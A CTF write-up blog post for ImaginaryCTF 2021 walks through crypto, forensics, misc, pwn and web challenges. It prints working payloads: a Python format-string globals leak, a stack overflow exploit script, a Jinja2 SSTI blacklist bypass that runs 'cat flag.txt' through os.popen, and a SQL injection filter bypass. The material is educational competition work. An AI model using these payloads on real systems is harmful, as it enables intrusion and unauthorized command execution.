---
layout: post
title: ImaginaryCTF - 2021
date: 2021-07-28 05:00:00 +0000
category: [CTFs,"ImaginaryCTF 2021"]
tags: [ctf,misc,crypto,bof,web,forensic,pwn,reversing]
---

---
Imaginary CTF is a Capture The Flag event that spanned over a period of 4 days. Honestly speaking, I couldn't clear much since I had only a few hours to spare for the 4 days. But it was fun. This post will be a writeup of the challenges that I solved in the imaginary CTF.
<br>
![cover_image](/assets/img/ctfs/ictf/1.png)
<br>

## <ins>Crypto</ins>
---
### <ins>Chicken Caesar Salad</ins>
---
First up is the crypto section.

The challenge is a decrypting a the contents of a text file
<br>
<pre>qkbn{ePmv_lQL_kIMamZ_kQxpMZa_oMb_aW_pIZl}</pre>

This is a pretty straight forward rot13 encoding. I used ```CyberChef``` to decode it. It is ```rot 13``` encode with the ```key value 18```.
<br>
<pre>flag: ictf{wHen_dID_cAEseR_cIphERs_gEt_sO_hARd}</pre>


## <ins>Forensic</ins>
---
### <ins>Hidden</ins>
---
The challenge file is a adobe photo image file with the ```.psd``` extension. To get the flag just use the ```strings``` utility.
<br>
<pre> strings 10C4-challenge.psd | grep ictf{ </pre>
<br>
And we can get the flag.

<pre>flag: ictf{wut_how_do_you_see_this}</pre>


## <ins>Misc</ins>
---
### <ins>Formatting</ins>
---
A challenge is a python file. If we run the service using the netcat utility and give some random input, it returns the same string. After reading the source code, I found that format string is used to return the string. We can exploit to format string to get the global variable. Use the following payload.
<br>
<pre>hello_{a.__init__.__globals__}</pre>

Alternatively you can use the following python script.

<pre>
#!/usr/bin/python3

from pwn import *
io = remote('chal.imaginaryctf.org',42014)

io.recvuntil(">")
io.sendline("hello_{a.__init__.__globals__}")
print(io.recvuntil("}"))

io.interactive()
</pre>
<br>
We can see the flag in the output returned.
<br>
<pre>flag: ictf{c4r3rul_w1th_f0rmat_str1ngs_4a2bd219}</pre>
<br>
If you want to read in detail about this vulnerability check this out: <https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python>


### <ins>Spelling Test</ins>
---
The challenge it to correct the missplet words and put the correct letters in order to get the flag. At first I tried using the python module ```Enchant``` but it was such a fiasco. So, I decided to use a ```online spell checker``` to seperate out the misspelt words. The following words are the misspelt words in the words.txt file.
<br>
<pre>
convirgence
translatcr
addretsing
approachfs
subscrybers
endangored
modufications
rehapilitation
camputers
classisal
munisipality
engineereng
requiremend
generatint
recruitmeht
applicasions
instalping
broadcesting
attractlve
obituarles
bibliogriphy
avainable
instructiongl
strengthenint
discherge
subscriptisn
copyrightet
</pre>

And so, we can get the flag.
<br>
<pre>flag: ictf{youpassedthespellingtest}</pre>


### <ins>Imaginary</ins>
---
The first thing I tried is netcatting the service. I found that it gives a complex number sum/difference challenge and we need o solve it. If the answer is correct it gives another problem to solve and if it is wrong it breaks out of the loop. After reading the source code found that it should be done 300 times. With the little knowlegde I had with the ```python pwntools``` I wrote the following script.
<br>
<pre>
#!/usr/bin/python3

from pwn import *
import re

io = remote('chal.imaginaryctf.org',42015)
io.recvuntil("out!)")

for _ in range(0,300):
    f = io.recvuntil(">")
    #print(str(f))
    
    #Seperating the digits and signs that was found in the output
    digits = re.findall(r'[0-9]*',str(f))
    signs = re.findall(r'[+-]',str(f))

    lst = []
    lst1 = []
    
    #Not gonna lie, this part was seriously nerve wrecking
    #This for loop is to seperate the whitespaces 
    for i in digits:
        if i.isdigit():
            lst.append(int(i))

    #This for loop is to make a sublist of 2 elements
    for i in range(0,len(lst)-1,2):
        lst1.append(list(lst[i:i+2]))
    
    #I guess you can easily understand this part
    mid_sign = ['+']
    #print(*signs)
    for ind, val in enumerate(signs):
        if ind % 2 == 1:
            mid_sign.append(val)
    #print(*mid_sign)
    
    for ind, val in enumerate(mid_sign):
        if val == '-':
            lst1[ind][0] *= -1
            lst1[ind][1] *= -1
        else:
            continue
            
    #print(*lst1)
    #print("signs: ",*signs)

    real = 0; img = 0
    
    #Final touches to get the sum/difference
    for i in range(0,len(lst1)):
        real += lst1[i][0]
        img += lst1[i][1]
    
    if '-' not in str(img):
        res = str(real)+'+'+str(img)+'i'
    else:
        res = str(real)+str(img)+'i'
    #print(res)
    io.sendline(res)

    print(io.recvuntil("Correct!"))
io.interactive()
</pre><br>

I have left the comments in the scripts untouched, so feel free to use them if you dont understand how it works.
<br>
<pre>flag: ictf{n1c3_y0u_c4n_4dd_4nd_subtr4ct!_49fd21bc}</pre>


## <ins>Pwn</ins>
---
### <ins>Stackoverflow</ins>
---
I downloaded the challenge file. After inspecting the file found that it is an ELF file. So, I opened it in ```Ghidra```. Found that the varible ```local_10``` should be overflowed and should be pointed to the address ```0x69637466``` . I got the flag by running the following python script.
<br>
<pre>
#!/usr/bin/python

from pwn import *

io = remote('chal.imaginaryctf.org',42001)

io.recvuntil("color?")
io.sendline("A"*40+"\x66\x74\x63\x69")

io.interactive()
</pre><br>

<pre>flag: ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}</pre>


## <ins>Web<ins>
---
### <ins>Saas</ins>
---
The challenge is to bypass the checks to get the flag. The description gave the basic idea that it uses ```sed```. This is a pretty straightforward challenge if you are familiar with bash. After reading the blacklist I used to wildcard operator to bypass the checks. You can either input this:
<br>
<pre> '' *</pre>

Or you can use this ```curl``` command.
<br>
<pre>curl https://saas.chal.imaginaryctf.org/backend?query=%27%27+* | grep ictf</pre>

<pre>flag: ictf{:roocu:roocu:roocu:roocu:roocu:roocursion:rsion:rsion:rsion:rsion:rsion:_473fc2d1}</pre>


### <ins>Build A Website</ins>
---
This was a fun challenge. This is based on the ```python Jinja2 SSTI``` vulnerability to get the program to read the flag. Firstly, I checked that I is vulnerable to SSITI with the following payload:
<br>
<pre>{%raw%}{{'7'*7}}{%endraw%}</pre>

This returned ```7777777``` in the webpage.

After reading the source code I found that most keywords or substrings of keywords are blacklisted. So, to get the flag, we need to use the functions without trigerring the blacklist strings.
<pre>{%raw%}{{request['application']['__globa'+'ls__']['__builtins__']['__import__']('os')['popen']('cat flag.txt')['read']()}}{%endraw%}</pre>
<pre>flag: ictf{:rooYay:_:rooPOG:_:rooHappy:_:rooooooooooooooooooooooooooo:}</pre>

For further reference: <https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/>


### <ins>Awkward Bypass</ins>
---
I was only able to complete partway. After reading the source code I found that the checks for the blacklist is not done recursively. So, I used the following payload.
<br>
<pre>' oorr 1=1--</pre>

And the website returned: ```Ummmmmmm, did you expect a flag to be here?```.

I tried using ```order by``` and ```union select``` but I didnt get anywhere.


### <ins>Roos world</ins>
---
I found the comment in the source page of the website which I identified to be the programming language ```JSFuck```. I used online tools to run the file.

Source: <https://enkhee-osiris.github.io/Decoder-JSFuck/>
<br>
<pre>console.log(atob("aWN0ZnsxbnNwM2N0MHJfcjAwX2cwZXNfdGgwbmt9"));</pre>

This is base64 encoded.
<br>
<pre>echo "aWN0ZnsxbnNwM2N0MHJfcjAwX2cwZXNfdGgwbmt9" | base64 -d</pre>
<pre>flag: ictf{1nsp3ct0r_r00_g0es_th0nk}</pre>

<br>
That's it folks. Happy hacking!!!
